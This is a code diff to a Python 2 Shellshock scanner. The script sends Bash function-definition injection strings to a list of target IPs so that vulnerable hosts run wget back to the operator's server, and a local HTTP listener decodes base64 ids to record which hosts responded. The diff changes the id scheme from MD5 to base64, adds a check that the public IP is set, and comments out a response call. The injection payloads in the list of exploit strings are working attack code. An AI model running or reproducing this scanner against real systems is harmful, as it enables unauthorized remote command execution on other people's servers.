@@ -1,5 +1,3 @@
-#Now with multiple threads
-
 import Queue
 import SocketServer
 import SimpleHTTPServer
@@ -11,6 +9,7 @@ import hashlib
 import socket
 import time
 import os
+import base64
 
 max_threads = 20
 
@@ -18,8 +17,8 @@ local_ip = socket.gethostbyname(socket.gethostname())
 
 
 ####GOTTA SET THESE!!!
-local_ip = ""
-public_ip = ""
+local_ip = "0.0.0.0"
+public_ip = "-----"
 local_port = 80
 https_port = 443
 ids = {}
@@ -33,14 +32,15 @@ def record_scan_response():
 	
 class CustomHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 	def do_GET(self):
+		id = self.path[1::]
+		print "%s ### ### ### Responded ### ### ### \n" % base64.b64decode(id) 
 
-		print self.path[1::]
 		try:
-			print "%s ### ### ### Responded ### ### ### \n" % ids[self.path[1::]] 
+			print "%s ### ### ### Responded ### ### ### \n" % base64.b64decode(id) 
 			self.send_response(200)
 			self.send_header('Content-type','text/html')
 			self.end_headers()
-			self.wfile.write(record_scan_response()) #call sample function here
+		#	self.wfile.write(record_scan_response()) #call sample function here
 		except:
 			print("Unknown address responded, ID=%s" % self.path[1::])
 			self.send_response(200)
@@ -52,10 +52,10 @@ class CustomHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 def test_ip(ip_address, identifier):
 	#Send a Bash/CGI Injection with the unique identifier.
 	#public_ip = public_ip.strip()
-	print "Starting scan for %s" % ip_address
+	print "Starting scan for %s (ID: %s)" % (ip_address,identifier)
 	ip_address = ip_address.strip()
 	identifier = identifier.strip()
-	
+		
 	list_of_exp_str = [ "() { :; }; wget http://" + public_ip + "/" + identifier + " >> /dev/null",
 			   "() { :; }; /usr/bin/wget http://" + public_ip + "/" + identifier + " >> /dev/null",
 			   "() { :; }; /bin/bash -c 'wget http://" + public_ip + "/" + identifier + " >> /dev/null'",
@@ -96,9 +96,10 @@ def create_ip_scan_table(ips):
 	hash_table = {}
 	for ip in ips:
 		ip = ip.strip()
-		m = hashlib.md5()
-		m.update(str(ip)+salt)
-		hash_table[m.hexdigest()]=ip
+		#m = hashlib.md5()
+		#m.update(str(ip)+salt)
+		id = base64.b64encode(str(ip)+salt)
+		hash_table[id]=ip
 	return hash_table
 		
 def usage():
@@ -120,6 +121,10 @@ def main():
 		usage()
 		sys.exit()
 
+	if public_ip == "-----":
+		print "Must set public_ip in script"
+		exit()
+		
 	#Get all our opts in place.
 	for o, a in opts:
 		if o == "-h":
